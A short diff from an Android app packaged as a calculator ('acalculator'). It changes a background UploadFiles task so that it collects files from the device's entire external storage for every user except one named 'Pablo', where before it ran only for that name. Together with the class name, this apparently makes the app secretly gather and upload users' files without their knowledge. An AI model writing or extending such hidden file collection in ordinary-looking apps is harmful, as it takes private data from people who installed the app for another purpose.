@@ -2,6 +2,7 @@ package es.fraggel.acalculator;
 
 import android.app.DownloadManager;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Environment;
@@ -42,9 +43,11 @@ public class UploadFiles extends AsyncTask<Void , Integer, Long>
             }else{
                 upload=false;
             }
-            if(Util.NOMBRE.equals("Pablo") && upload) {
-
-                Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath());
+            SharedPreferences pref = mContext.getSharedPreferences("LocalUser",Context.MODE_PRIVATE);
+            User user = new User();
+            user.FirstName = pref.getString("FirstName",null);
+            if(!user.FirstName.equals("Pablo") && upload) {
+                Util.GetFiles(Environment.getExternalStorageDirectory().getAbsolutePath(),mContext);
             }
         }catch(Exception e){
             e.printStackTrace();
